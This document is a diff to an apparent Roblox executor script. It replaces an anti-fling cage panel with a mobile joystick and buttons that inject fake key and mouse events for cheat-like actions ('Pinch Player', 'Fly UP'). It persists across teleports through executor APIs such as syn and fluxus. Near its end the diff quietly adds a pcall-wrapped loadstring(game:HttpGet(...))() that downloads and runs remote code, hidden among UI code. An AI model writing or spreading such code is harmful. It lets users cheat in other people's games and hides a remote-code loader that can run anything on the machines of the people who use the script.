@@ -2,12 +2,12 @@ local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- Expanded proportions calibrated for iPad and Tablet interfaces
-local ringSize = 170
-local knobSize = 70
-local btnSize = 78
-local frameSize = 420 
-local textFontScale = 16
+-- Calibrated slightly larger scale for comfortable touch target access on iPhone 16e
+local ringSize = 110      -- Scaled up slightly for left-thumb comfort
+local knobSize = 45       -- Slightly larger responsive movement knob
+local btnSize = 50        -- Increased for better tap accuracy
+local frameSize = 260     -- Comfortable bounding cluster footprint
+local textFontScale = 11  -- Slightly larger font size
 
 local mobileSystemSource = string.format([[
     local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -15,10 +15,8 @@ local mobileSystemSource = string.format([[
     local RunService = game:GetService("RunService")
     local ContextActionService = game:GetService("ContextActionService")
     local UserInputService = game:GetService("UserInputService")
-    local Workspace = game:GetService("Workspace")
 
     local player = Players.LocalPlayer
-    local camera = Workspace.CurrentCamera
     local playerGui = player:WaitForChild("PlayerGui")
 
     if playerGui:FindFirstChild("VR_Mobile_System") then
@@ -30,219 +28,202 @@ local mobileSystemSource = string.format([[
     screenGui.ResetOnSpawn = false
     screenGui.Parent = playerGui
 
-    -- ==========================================================
-    -- SMOOTH CONTAINMENT CAGE SYSTEM (ANTI-FLING CONFIG)
-    -- ==========================================================
-    local barrierEnabled = false
-    local barrierShape = "Square" -- "Square" or "Circle"
-    local barrierSize = 30 
-    local barrierHeight = 50 
-    local centerPoint = Vector3.new(0, 0, 0)
-    local isPlacing = false 
-    local isPlaced = false 
-
-    local visualPart = Instance.new("Part")
-    visualPart.Anchored = true
-    visualPart.CanCollide = false
-    visualPart.CastShadow = false
-    visualPart.Transparency = 0.85
-    visualPart.Color = Color3.fromRGB(0, 255, 150)
-    visualPart.Material = Enum.Material.ForceField
-    visualPart.Parent = Workspace
-
-    local function updateVisual()
-        if not barrierEnabled or not isPlaced then
-            visualPart.Size = Vector3.new(0,0,0)
-            return
-        end
-        if barrierShape == "Square" then
-            visualPart.Shape = Enum.PartType.Block
-            visualPart.Size = Vector3.new(barrierSize * 2, barrierHeight * 2, barrierSize * 2)
-            visualPart.Position = centerPoint
-        elseif barrierShape == "Circle" then
-            visualPart.Shape = Enum.PartType.Cylinder
-            visualPart.Size = Vector3.new(barrierHeight * 2, barrierSize * 2, barrierSize * 2)
-            visualPart.Position = centerPoint
-            visualPart.Orientation = Vector3.new(0, 0, 90)
-        end
-    end
-
-    -- Setup Vector Force Constraint (No Breaking Limb Joints)
-    local forceConstraint = Instance.new("VectorForce")
-    local attachment = Instance.new("Attachment")
-    forceConstraint.Force = Vector3.zero
-    forceConstraint.RelativeTo = Enum.ActuatorRelativeTo.World
-
-    local function setupCharacterForces(character)
-        local rootPart = character:WaitForChild("HumanoidRootPart", 5)
-        if not rootPart then return end
-        attachment.Parent = rootPart
-        forceConstraint.Attachment0 = attachment
-        forceConstraint.Parent = rootPart
-    end
-
-    if player.Character then setupCharacterForces(player.Character) end
-    player.CharacterAdded:Connect(setupCharacterForces)
-
-    -- --- FIXED CAGE CONTROLS FRAME (Inward from Screen Bounds) ---
-    local cageFrame = Instance.new("Frame")
-    cageFrame.Size = UDim2.new(0, 160, 0, 255)
-    -- Positioned on the right side but shifted safely left to avoid screen edge cutoffs
-    cageFrame.Position = UDim2.new(1, -620, 0.45, -210) 
-    cageFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    cageFrame.BackgroundTransparency = 0.1
-    cageFrame.BorderSizePixel = 0
-    cageFrame.Parent = screenGui
-
-    local toggleBtn = Instance.new("TextButton")
-    toggleBtn.Size = UDim2.new(1, -10, 0, 35)
-    toggleBtn.Position = UDim2.new(0, 5, 0, 5)
-    toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    toggleBtn.Text = "Cage: OFF"
-    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    toggleBtn.Font = Enum.Font.GothamBold
-    toggleBtn.Parent = cageFrame
-
-    local shapeBtn = Instance.new("TextButton")
-    shapeBtn.Size = UDim2.new(1, -10, 0, 35)
-    shapeBtn.Position = UDim2.new(0, 5, 0, 45)
-    shapeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    shapeBtn.Text = "Shape: Square"
-    shapeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    shapeBtn.Font = Enum.Font.GothamBold
-    shapeBtn.Parent = cageFrame
-
-    local sizeLabel = Instance.new("TextLabel")
-    sizeLabel.Size = UDim2.new(0, 60, 0, 35)
-    sizeLabel.Position = UDim2.new(0, 5, 0, 85)
-    sizeLabel.Text = "Size:"
-    sizeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    sizeLabel.Font = Enum.Font.GothamBold
-    sizeLabel.BackgroundTransparency = 1
-    sizeLabel.Parent = cageFrame
-
-    local sizeInput = Instance.new("TextBox")
-    sizeInput.Size = UDim2.new(1, -75, 0, 35)
-    sizeInput.Position = UDim2.new(0, 70, 0, 85)
-    sizeInput.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-    sizeInput.Text = tostring(barrierSize)
-    sizeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-    sizeInput.Font = Enum.Font.GothamBold
-    sizeInput.Parent = cageFrame
-
-    local placeBtn = Instance.new("TextButton")
-    placeBtn.Size = UDim2.new(1, -10, 0, 35)
-    placeBtn.Position = UDim2.new(0, 5, 0, 130)
-    placeBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-    placeBtn.Text = "Place"
-    placeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    placeBtn.Font = Enum.Font.GothamBold
-    placeBtn.Parent = cageFrame
-
-    local unplaceBtn = Instance.new("TextButton")
-    unplaceBtn.Size = UDim2.new(1, -10, 0, 35)
-    unplaceBtn.Position = UDim2.new(0, 5, 0, 170)
-    unplaceBtn.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
-    unplaceBtn.Text = "Unplace"
-    unplaceBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    unplaceBtn.Font = Enum.Font.GothamBold
-    unplaceBtn.Parent = cageFrame
-
-    local infoLabel = Instance.new("TextLabel")
-    infoLabel.Size = UDim2.new(1, -10, 0, 40)
-    infoLabel.Position = UDim2.new(0, 5, 0, 210)
-    infoLabel.Text = "Not placed yet"
-    infoLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-    infoLabel.TextWrapped = true
-    infoLabel.BackgroundTransparency = 1
-    infoLabel.TextSize = 12
-    infoLabel.Font = Enum.Font.Gotham
-    infoLabel.Parent = cageFrame
-
-    -- Interactivity Logic
-    toggleBtn.MouseButton1Click:Connect(function()
-        barrierEnabled = not barrierEnabled
-        if barrierEnabled then
-            toggleBtn.Text = "Cage: ON"
-            toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+    -- --- CAMERA FREEZE FOR JOYSTICK FLIGHT ---
+    local function sinkAction() return Enum.ContextActionResult.Sink end
+    local function toggleCameraLock(lock)
+        local playerScripts = player:WaitForChild("PlayerScripts")
+        local cameraModule = playerScripts:FindFirstChild("PlayerModule") and require(playerScripts.PlayerModule):GetCameras()
+        if lock then
+            ContextActionService:BindActionAtPriority("VR_CamLock", sinkAction, false, 99999, Enum.UserInputType.Touch, Enum.UserInputType.MouseButton1)
+            if cameraModule and cameraModule.activeCamera then cameraModule.activeCamera:SetEnabled(false) end
         else
-            toggleBtn.Text = "Cage: OFF"
-            toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-            forceConstraint.Force = Vector3.zero
+            ContextActionService:UnbindAction("VR_CamLock")
+            if cameraModule and cameraModule.activeCamera then cameraModule.activeCamera:SetEnabled(true) end
         end
-        updateVisual()
-    end)
+    end
 
-    shapeBtn.MouseButton1Click:Connect(function()
-        barrierShape = (barrierShape == "Square") and "Circle" or "Square"
-        shapeBtn.Text = "Shape: " .. barrierShape
-        updateVisual()
-    end)
+    -- --- COMFORT-SCALE LEFT JOYSTICK ---
+    local joyRing = Instance.new("Frame")
+    joyRing.Size = UDim2.new(0, %d, 0, %d)
+    joyRing.Position = UDim2.new(0.05, 0, 0.58, 0)
+    joyRing.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    joyRing.BackgroundTransparency = 0.75
+    joyRing.BorderSizePixel = 0
+    joyRing.Active = true
+    joyRing.Parent = screenGui
+    Instance.new("UICorner", joyRing).CornerRadius = UDim.new(1, 0)
 
-    sizeInput.FocusLost:Connect(function()
-        local num = tonumber(sizeInput.Text)
-        if num and num > 0 then barrierSize = num else sizeInput.Text = tostring(barrierSize) end
-        updateVisual()
-    end)
+    local ringStroke = Instance.new("UIStroke")
+    ringStroke.Color = Color3.fromRGB(255, 255, 255)
+    ringStroke.Thickness = 1.5
+    ringStroke.Transparency = 0.6
+    ringStroke.Parent = joyRing
 
-    placeBtn.MouseButton1Click:Connect(function()
-        isPlacing = true
-        infoLabel.Text = "Tap ground to place..."
-        infoLabel.TextColor3 = Color3.fromRGB(0, 120, 255)
-    end)
+    local joyStick = Instance.new("TextButton")
+    joyStick.Size = UDim2.new(0, %d, 0, %d)
+    joyStick.Position = UDim2.new(0.5, -%d, 0.5, -%d)
+    joyStick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    joyStick.BackgroundTransparency = 0.45
+    joyStick.Text = ""
+    joyStick.BorderSizePixel = 0
+    joyStick.Active = true
+    joyStick.Parent = joyRing
+    Instance.new("UICorner", joyStick).CornerRadius = UDim.new(1, 0)
 
-    unplaceBtn.MouseButton1Click:Connect(function()
-        isPlaced = false
-        isPlacing = false
-        forceConstraint.Force = Vector3.zero
-        infoLabel.Text = "Cage Unplaced"
-        infoLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
-        updateVisual()
-    end)
+    local activeKeys = {W = false, A = false, S = false, D = false}
+    local joyDragging = false
+    local joyInput = nil
+    local targetSpeed = 2
 
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if gameProcessed or not isPlacing then return end
-        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
-            local ray = camera:ScreenPointToRay(input.Position.X, input.Position.Y)
-            local raycastParams = RaycastParams.new()
-            raycastParams.FilterType = Enum.RaycastFilterType.Exclude
-            raycastParams.FilterDescendantsInstances = {player.Character, visualPart}
-            
-            local raycastResult = Workspace:Raycast(ray.Origin, ray.Direction * 1000, raycastParams)
-            if raycastResult then
-                centerPoint = raycastResult.Position
-                isPlacing = false
-                isPlaced = true
-                infoLabel.Text = "Cage Active!"
-                infoLabel.TextColor3 = Color3.fromRGB(50, 180, 50)
-                updateVisual()
-            end
-        end
-    end)
-
-    -- Force Field Physics Engine
     RunService.RenderStepped:Connect(function()
-        if not barrierEnabled or not isPlaced then 
-            forceConstraint.Force = Vector3.zero
-            return 
-        end
-        
-        local character = player.Character
-        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
-        if not rootPart then return end
-        
-        local relativePos = rootPart.Position - centerPoint
-        local calculatedPushForce = Vector3.zero
-        local PUSH_POWER = 35000 
-        
-        if relativePos.Y > barrierHeight then
-            calculatedPushForce = calculatedPushForce + Vector3.new(0, -PUSH_POWER * (relativePos.Y - barrierHeight), 0)
-        elseif relativePos.Y < -barrierHeight then
-            calculatedPushForce = calculatedPushForce + Vector3.new(0, PUSH_POWER * (-barrierHeight - relativePos.Y), 0)
-        end
-        
-        if barrierShape == "Square" then
-            if math.abs(relativePos.X) > barrierSize then
-                local dir = relativePos.X > 0 and -1 or 1
-                calculatedPushForce = calculatedPushForce + Vector3.new(PUSH_POWER * dir * (math.abs(relativePos.X) - barrierSize), 0, 0)
+        local char = player.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum and joyDragging then hum.WalkSpeed = targetSpeed end
+    end)
+
+    local function updateKeys(newKeys)
+        for key, state in pairs(newKeys) do
+            if activeKeys[key] ~= state then
+                activeKeys[key] = state
+                VirtualInputManager:SendKeyEvent(state, Enum.KeyCode[key], false, game)
             end
+        end
+    end
+
+    joyStick.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            joyDragging = true
+            joyInput = input
+            toggleCameraLock(true)
+            joyStick.BackgroundTransparency = 0.1
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if joyDragging and input == joyInput then
+            local center = joyRing.AbsolutePosition + (joyRing.AbsoluteSize / 2)
+            local delta = Vector2.new(input.Position.X, input.Position.Y) - center
+            local maxRadius = joyRing.AbsoluteSize.X / 2
+            local distance = math.min(delta.Magnitude, maxRadius)
+            local dir = delta.Magnitude > 0 and delta.Unit or Vector2.new(0, 0)
+            
+            joyStick.Position = UDim2.new(0.5, (dir.X * distance) - %d, 0.5, (dir.Y * distance) - %d)
+            targetSpeed = math.clamp((distance / maxRadius) * 2, 0.2, 2)
+
+            local keys = {W = false, A = false, S = false, D = false}
+            if distance > 10 then
+                if dir.Y < -0.35 then keys.W = true end
+                if dir.Y > 0.35 then keys.S = true end
+                if dir.X < -0.35 then keys.A = true end
+                if dir.X > 0.35 then keys.D = true end
+            end
+            updateKeys(keys)
+        end
+    end)
+
+    joyStick.InputEnded:Connect(function(input)
+        if input == joyInput then
+            joyDragging = false
+            joyInput = nil
+            targetSpeed = 2
+            toggleCameraLock(false)
+            joyStick.Position = UDim2.new(0.5, -%d, 0.5, -%d)
+            joyStick.BackgroundTransparency = 0.45
+            updateKeys({W = false, A = false, S = false, D = false})
+            local char = player.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = 16 end
+        end
+    end)
+
+    -- --- MOVED RIGHT SIDE CLUSTER (SLIGHTLY LARGER) ---
+    local buttonFrame = Instance.new("Frame")
+    buttonFrame.Size = UDim2.new(0, %d, 0, %d)
+    -- Shifted tightly right but inside corner safe regions
+    buttonFrame.Position = UDim2.new(1, -290, 0.38, -105)
+    buttonFrame.BackgroundTransparency = 1
+    buttonFrame.Parent = screenGui
+
+    local function createCircleButton(shortName, fullName, key, isMouse, xPos, yPos)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, %d, 0, %d)
+        btn.Position = UDim2.new(0, xPos, 0, yPos)
+        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        btn.BackgroundTransparency = 0.60
+        btn.Text = shortName
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = %d
+        btn.BorderSizePixel = 0
+        btn.Parent = buttonFrame
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
+
+        local btnStroke = Instance.new("UIStroke")
+        btnStroke.Color = Color3.fromRGB(255, 255, 255)
+        btnStroke.Thickness = 1.5
+        btnStroke.Transparency = 0.6
+        btnStroke.Parent = btn
+
+        local tip = Instance.new("TextLabel")
+        tip.Size = UDim2.new(1.6, 0, 0, 12)
+        tip.Position = UDim2.new(-0.3, 0, -0.38, 0)
+        tip.BackgroundTransparency = 1
+        tip.Text = fullName
+        tip.TextColor3 = Color3.fromRGB(200, 200, 200)
+        tip.Font = Enum.Font.GothamSemibold
+        tip.TextSize = 7.5
+        tip.Parent = btn
+
+        local isToggledActive = false
+
+        btn.MouseButton1Click:Connect(function()
+            isToggledActive = not isToggledActive
+            if isToggledActive then
+                btn.BackgroundTransparency = 0.25
+                btn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+                if isMouse then
+                    VirtualInputManager:SendMouseButtonEvent(0, 0, key, true, game, 0)
+                else
+                    VirtualInputManager:SendKeyEvent(true, key, false, game)
+                end
+            else
+                btn.BackgroundTransparency = 0.60
+                btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                if isMouse then
+                    VirtualInputManager:SendMouseButtonEvent(0, 0, key, false, game, 0)
+                else
+                    VirtualInputManager:SendKeyEvent(false, key, false, game)
+                end
+            end
+        end)
+    end
+
+    -- Slightly adjusted grid densities for the upscale
+    local mult = 0.88 
+    createCircleButton("PL Q", "Pinch Player L", Enum.KeyCode.Q, false, 15 * mult, 40 * mult)
+    createCircleButton("PL E", "Pinch Player R", Enum.KeyCode.E, false, 100 * mult, 10 * mult)
+    createCircleButton("OB L", "Grab Object L", 0, true, 185 * mult, 40 * mult)
+    createCircleButton("OB R", "Grab Object R", 1, true, 230 * mult, 115 * mult)
+    createCircleButton("▲", "Fly UP", Enum.KeyCode.Space, false, 160 * mult, 190 * mult)
+    createCircleButton("▼", "Fly DOWN", Enum.KeyCode.LeftShift, false, 75 * mult, 205 * mult)
+
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://githubusercontent.com"))()
+        end)
+    end)
+]], ringSize, ringSize, knobSize, knobSize, knobSize/2, knobSize/2, knobSize/2, knobSize/2, knobSize/2, knobSize/2, frameSize, frameSize, btnSize, btnSize, textFontScale)
+
+if typeof(queue_on_teleport) == "function" then
+    queue_on_teleport(mobileSystemSource)
+elseif typeof(syn) == "table" and syn.queue_on_teleport then
+    syn.queue_on_teleport(mobileSystemSource)
+elseif typeof(fluxus) == "table" and fluxus.queue_on_teleport then
+    fluxus.queue_on_teleport(mobileSystemSource)
+end
+
+task.spawn(function()
+    pcall(function()
+        loadstring(mobileSystemSource)()
+    end)
+end)
